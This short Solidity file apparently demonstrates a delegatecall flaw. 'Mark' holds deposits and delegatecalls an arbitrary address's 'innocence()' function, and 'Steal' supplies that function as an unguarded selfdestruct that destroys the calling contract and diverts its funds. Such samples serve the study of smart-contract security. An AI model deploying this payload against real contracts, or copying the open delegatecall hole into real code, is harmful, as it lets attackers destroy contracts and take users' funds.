pragma solidity ^0.4.2;
contract Steal{
    address owner;
    function Steal() {
        owner = msg.sender;
}
function kill() {    // 这是销毁的标准做法
	if (msg.sender == owner) {
	selfdestruct(owner);
}
}
    function innocence() {
        selfdestruct(owner);  // 销毁合约
    }
}

contract Mark {
    function Deposit() payable {}
    function call(address a) {
        a.delegatecall(bytes4(sha3("innocence()")));
    }
}
